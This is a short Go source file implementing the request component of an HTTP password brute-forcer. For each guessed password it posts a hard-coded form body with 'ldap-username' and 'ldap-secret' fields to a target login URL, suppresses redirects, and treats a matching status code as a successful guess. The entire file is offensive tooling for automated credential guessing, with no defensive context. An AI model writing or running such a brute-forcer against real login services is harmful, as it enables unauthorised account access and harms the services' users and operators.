package main

import (
	"fmt"
	"net/http"
	"strings"
)

type NetHttpBruteImpl struct {
	URL                string
	Method             string
	Username           string
	ExpectedStatusCode int
	Headers            map[string]string // "User-Agent": "Firefox"
}

func NewHttpBruteImpl(method, url, username string, expectedStatusCode int, headers map[string]string) *NetHttpBruteImpl {
	return &NetHttpBruteImpl{
		Method:             strings.ToUpper(method),
		URL:                url,
		Username:           username,
		ExpectedStatusCode: expectedStatusCode,
		Headers:            headers,
	}
}

func (c *NetHttpBruteImpl) Do(password string) (bool, error) {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`, c.Username, password)
	req, err := http.NewRequest(c.Method, c.URL, strings.NewReader(payload))
	if err != nil {
		return false, err
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for k, v := range c.Headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	return resp.StatusCode == c.ExpectedStatusCode, nil
}
